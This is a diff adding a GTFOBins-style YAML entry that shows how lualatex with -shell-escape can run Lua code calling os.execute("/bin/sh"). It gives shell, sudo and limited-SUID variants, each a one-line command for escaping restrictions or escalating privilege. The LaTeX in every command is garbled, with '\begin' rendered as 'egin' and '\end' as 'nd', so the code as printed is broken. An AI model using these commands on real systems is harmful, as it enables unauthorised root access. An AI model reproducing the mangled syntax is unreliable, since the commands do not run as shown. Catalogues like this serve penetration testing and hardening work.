@@ -1,0 +1,9 @@
+description: This allows to execute [`lua`](/gtfobins/lua/) code.
+functions:
+shell:
+- code: lualatex -shell-escape '\documentclass{article}egin{document}\directlua{os.execute("/bin/sh")}nd{document}'
+sudo:
+- code: sudo lualatex -shell-escape '\documentclass{article}egin{document}\directlua{os.execute("/bin/sh")}nd{document}'
+limited-suid:
+- code: ./lualatex -shell-escape '\documentclass{article}egin{document}\directlua{os.execute("/bin/sh")}nd{document}'
+---
